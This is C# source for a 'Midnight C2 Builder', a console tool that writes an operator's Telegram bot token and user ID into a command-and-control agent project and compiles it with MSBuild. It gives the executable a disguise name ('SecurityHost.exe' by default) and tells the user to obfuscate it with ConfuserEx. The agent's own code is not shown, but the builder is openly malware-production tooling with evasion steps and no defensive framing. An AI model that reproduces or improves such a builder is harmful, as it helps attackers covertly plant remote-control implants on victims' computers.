using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace MidnightBuilder
{
    /// <summary>
    /// Midnight C2 Builder - Creates configured agent executables
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"
   __  ____    __      _       __    __     _______ ___  
  /  |/  (_)__/ /__   (_)__ _ / /   / /_   / ___/_ <__ \ 
 / /|_/ / / _  / _ \ / / _ `// _ \ / __/  / /__  __/ __/ 
/_/  /_/_/\_,_/_//_//_/\_, /_//_/ \__/   \___/ /____/   
                      /___/             Builder v1.0
");
            Console.ResetColor();

            // Get configuration
            Console.Write("Enter Telegram Bot Token: ");
            string botToken = Console.ReadLine()?.Trim();

            Console.Write("Enter your Telegram User ID: ");
            string userId = Console.ReadLine()?.Trim();

            Console.Write("Output filename (default: SecurityHost.exe): ");
            string outputName = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(outputName))
                outputName = "SecurityHost.exe";

            // Validate
            if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(userId))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] Bot Token and User ID are required!");
                Console.ResetColor();
                return;
            }

            Console.WriteLine("\n[*] Building agent...");

            // Find source files
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string solutionDir = Path.GetFullPath(Path.Combine(currentDir, "..", ".."));
            string agentDir = Path.Combine(solutionDir, "MidnightAgent");

            if (!Directory.Exists(agentDir))
            {
                // Try relative path
                agentDir = Path.GetFullPath(Path.Combine(currentDir, "..", "MidnightAgent"));
            }

            if (!Directory.Exists(agentDir))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Cannot find MidnightAgent folder at: {agentDir}");
                Console.ResetColor();
                return;
            }

            // Modify Config.cs with tokens
            string configPath = Path.Combine(agentDir, "Core", "Config.cs");
            if (!File.Exists(configPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Cannot find Config.cs");
                Console.ResetColor();
                return;
            }

            Console.WriteLine("[*] Injecting configuration...");
            string configContent = File.ReadAllText(configPath);
            string originalConfig = configContent; // Backup

            configContent = configContent.Replace("{BOT_TOKEN}", botToken);
            configContent = configContent.Replace("{USER_ID}", userId);
            File.WriteAllText(configPath, configContent);

            try
            {
                // Build using MSBuild
                Console.WriteLine("[*] Compiling...");
                
                string msbuildPath = FindMSBuild();
                if (string.IsNullOrEmpty(msbuildPath))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Cannot find MSBuild. Please install Visual Studio or Build Tools.");
                    Console.ResetColor();
                    return;
                }

                string csprojPath = Path.Combine(agentDir, "MidnightAgent.csproj");
                
                var psi = new ProcessStartInfo
                {
                    FileName = msbuildPath,
                    Arguments = $"\"{csprojPath}\" /p:Configuration=Release /p:OutputPath=\"{Path.Combine(solutionDir, "Output")}\" /verbosity:minimal",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (process.ExitCode != 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Build failed:");
                        Console.WriteLine(error);
                        Console.WriteLine(output);
                        Console.ResetColor();
                        return;
                    }
                }

                // Rename output
                string outputDir = Path.Combine(solutionDir, "Output");
                string builtExe = Path.Combine(outputDir, "MidnightAgent.exe");
                string finalExe = Path.Combine(outputDir, outputName);

                if (File.Exists(builtExe))
                {
                    if (File.Exists(finalExe) && finalExe != builtExe)
                        File.Delete(finalExe);
                    
                    if (finalExe != builtExe)
                        File.Move(builtExe, finalExe);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[+] Build successful!");
                    Console.WriteLine($"[+] Output: {finalExe}");
                    Console.WriteLine($"[+] Size: {new FileInfo(finalExe).Length / 1024} KB");
                    Console.ResetColor();

                    Console.WriteLine("\n[*] To obfuscate, run: ConfuserEx.CLI.exe on the output file");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Build succeeded but output file not found!");
                    Console.ResetColor();
                }
            }
            finally
            {
                // Restore original Config.cs
                File.WriteAllText(configPath, originalConfig);
            }

            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }

        static string FindMSBuild()
        {
            // Common MSBuild locations
            string[] possiblePaths = new[]
            {
                @"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe",
                @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
                @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
            };

            foreach (var path in possiblePaths)
            {
                if (File.Exists(path))
                    return path;
            }

            // Try PATH
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "where",
                    Arguments = "msbuild",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadLine();
                    process.WaitForExit();
                    if (!string.IsNullOrEmpty(output) && File.Exists(output))
                        return output;
                }
            }
            catch { }

            return null;
        }
    }
}
